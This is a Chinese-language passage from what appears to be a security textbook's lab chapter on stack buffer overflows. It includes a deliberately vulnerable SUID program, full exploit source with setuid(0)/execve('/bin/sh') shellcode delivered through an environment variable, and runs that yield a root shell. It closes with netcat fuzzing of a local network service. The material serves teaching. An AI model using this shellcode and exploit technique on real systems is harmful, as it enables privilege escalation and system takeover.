
# gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o exploit exploit.c
# chmod u+s meet
# useradd -m joe
# su joe
$ ./exploit 500 -300
Usage: ./exploit <buff_size> <offset> <esp:0xffff....>
ESP:0xbffff2dc Offset:0xfffffed4 Return:0xbffff408
Hello ������������������������������������������������������������1�1�.^�1��F�F
����������������������������������������������������������1�1�.^�1�1�F�F
 �V
1�g@�������/bin/sh�������������������������������������������������������
������������������������������������������������������������������������������
������������������������������������������������������������������������������
������������������������������������������������������������������������������
��������������������������������1�1�.^�1�1�F�F

�

�����V
1�g@�������/bin/sh�������������������������������������������������������
������������������������������������������������������������������������������
����������������
# id
uid=0(root) gid=1000(joeuser) groups=1000(joeuser)

它奏效了！请注意，我们以 root 身份编译了程序并将其设置为 SUID 程序。接着，我们切换到普通用户权限并运行了漏洞利用程序。我们获得了一个 root shell，运作良好。请注意，当使用 500 的缓冲区大小时，程序没有崩溃，而在之前的章节中我们使用 Perl 玩耍时程序会崩溃，这是因为本次我们以不同的方式调用了易受攻击的程序，即从漏洞利用程序内部调用。一般来说，这是一种更宽容的调用易受攻击程序的方式；不过，您的结果可能会有所不同。

## Lab 11-5: 利用小缓冲区

当易受攻击的缓冲区太小，无法像之前描述的那样使用漏洞利用缓冲区时会发生什么？大多数 shellcode 长度为 21–50 字节。如果您发现的易受攻击缓冲区只有 10 字节长怎么办？例如，让我们来看看带有小缓冲区的以下易受攻击代码：

```
#
# cat smallbuff.c
//smallbuff.c   This is a sample vulnerable program with a small buffer
#include <string.h>
int main(int argc, char * argv[]){
    char buff[10];   //small buffer
    strcpy( buff, argv[1]);  //problem: vulnerable function call
}
```

现在编译它并将其设置为 SUID：

```
# gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack \
-o smallbuff smallbuff.c
# chmod u+s smallbuff
# ls -l smallbuff
-rwsr-xr-x  1 root     root     4192 Apr 23 00:30 smallbuff
# cp smallbuff /home/joe
# su - joe
$ pwd
/home/joe
$
```

既然我们有了这样的程序，该如何利用它呢？答案在于使用环境变量。您可以将 shellcode 存储在环境变量或内存中的其他位置，然后将返回地址指向该环境变量，如下所示：

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#define VULN "./smallbuff"
#define SIZE 160
char shellcode[] =    //setuid(0) & Aleph1's shellcode + NOP Sled, see ref.
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"   //setuid(0) first
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";
int main(int argc, char **argv){
    // injection buffer
    char p[SIZE];
// put the shellcode in target's envp
char *env[] = { shellcode, NULL };

// pointer to array of arrays, what to execute
char *vuln[] = { VULN, p, NULL };
int *ptr, i, addr;

// calculate the exact location of the shellcode
addr = 0xbfffffff - strlen(shellcode) - strlen(VULN);
fprintf(stderr, "[***] using address: %#010x\n", addr);

/* fill buffer with computed address */
ptr = (int * )(p+2); //start 2 bytes into array for stack alignment
for (i = 0; i < SIZE; i += 4){
    *ptr++ = addr;
}

//call the program with execle, which takes the environment as input
execle(vuln[0], (char *)vuln,p,NULL, env);
exit(1);
}
```

```
joeuser@kali:/tmp$ gcc -o exploit2 exploit2.c
joeuser@kali:/tmp$ ./exploit2
[***] using address: 0xbffffffa
... /bin/sh
# id
uid=0(root) gid=1000(joeuser) groups=1000(joeuser)
```

为什么这行得通？事实证明，由名叫 Murat Balaban 的土耳其黑客发布的这一技术，依赖于这样一个事实：所有 Linux ELF 文件都被映射到内存中，其最后的相对地址为 0xbfffffff。请记住，从第 2 章可知，环境变量和参数存储在此区域，其下方即为栈。让我们详细查看高级进程内存：

![](img/5f597c6a70133069118d9e804ace3775_284_0.png)

请注意，内存的末尾以空值终止；接下来是程序名称，然后是环境变量，最后是参数。exploit2.c 中的以下代码行将进程的环境设置为 shellcode：

```
char *env[] = { shellcode, NULL };
```

这将 shellcode 的开头放置在精确位置：

Addr of shellcode=0xbffffffa-length(program name)-length(shellcode) 。

让我们使用 gdb 验证这一点。首先，为了辅助调试，在 shellcode 开头放置一个 \xcc，以便在执行 shellcode 时使调试器停止。接下来，重新编译程序并将其加载到调试器中：

```
# gcc -o exploit2 exploit2.c # after adding \xcc before shellcode
# gdb exploit2 --quiet
(no debugging symbols found)...(gdb)
(gdb) r
Starting program: /tmp/exploit2
[***] using address: 0xbfffff8a
process 13718 is executing new program: /tmp/smallbuff
�����������������������������������������������������������������������������
1�1.�^�1�?�F�F
        �
      ���?v
� ��?/bin/sh
                1�?@�?
Program received signal SIGTRAP, Trace/breakpoint trap.
0xbfffffba in ?? ()
(gdb) x/32z 0xbfffff8a
0xbfffff8a: 0x90909090 0x90909090 0x90909090 0x90909090
0xbfffff9a: 0x90909090 0x90909090 0x90909090 0x90909090
0xbfffffaa: 0x90909090 0x90909090 0x90909090 0xcc909090
0xbfffffba: 0xdb31c031 0x80cd17b0 0x895e1feb 0xc0310876
0xbfffffca: 0x89074688 0x0bb00c46 0x4e8df389 0x0c568d08
0xbfffffda: 0xdb3180cd 0xcd40d889 0xffdce880 0x622fffff
0xbfffffea: 0x732f6e69 0x2f2e0068 0x6c616d73 0x66756266
0xbfffffa: 0x00000066 Cannot access memory at address 0xc0000000
```

当我们带有 \xcc 字符执行时，我们看到当执行停止时，消息略有不同。在这种情况下，程序因 SIGTRAP 而停止，因为我们添加的 \xcc 创建了一个软断点。当我们的执行遇到 \xcc 时，程序停止，表明该应用程序成功到达了我们的 shellcode。

### 漏洞利用开发流程

现在我们已经掌握了基础，您可以查看现实世界中的示例了。在现实世界中，漏洞并不总是像 meet.c 示例那样简单直接，需要一个可重复的流程来成功利用。漏洞利用开发流程通常遵循以下步骤：

- 1. 控制 EIP。
- 2. 确定偏移量。
- 3. 确定攻击向量。
- 4. 构建漏洞利用程序。
- 5. 测试漏洞利用程序。
- 6. 如有需要，调试漏洞利用程序。

起初，您应该严格遵循这些步骤；稍后，您可以根据需要合并其中几个步骤。

## Lab 11-6: 构建自定义漏洞利用程序

在本实验中，我们将查看一个您未曾见过的示例应用程序。这个名为 ch11_6 的应用程序，可从 Gray Hat Hacking Github 仓库获取。

### 控制 EIP

ch11_6 程序是一个网络应用程序。当我们运行它时，可以看到它正在监听 5555 端口：

```
root@kali:~/book# ./ch11_6 &
[1] 27702
root@kali:~# netstat -anlp | grep ch11_6
tcp 0 0.0.0.0:5555 0.0.0.0:* LISTEN 772/ch11_6
```

在测试应用程序时，我们有时可以通过发送长字符串来发现弱点。在另一个窗口中，让我们使用 netcat 连接到运行的二进制文件：

```
root@kali:~/book# nc localhost 5555
---------Login---------
Username: Test
Invalid Login!
Please Try again
```

现在，让我们使用 Perl 创建一个非常长的字符串，并通过 netcat 连接将其作为用户名发送：

```
root@kali:~/book# perl -e 'print "A"x8096' | nc localhost 5555
---------Login---------
Username: root@kali:~/book#
```

我们的二进制文件在处理大字符串时表现不同。为了弄清楚原因，我们需要将其放入调试器中。我们将在一个窗口中使用 gdb 运行易受攻击的程序，并在另一个窗口中发送长字符串。

图 11-2 显示了在调试器屏幕中发送长字符串时发生的情况。
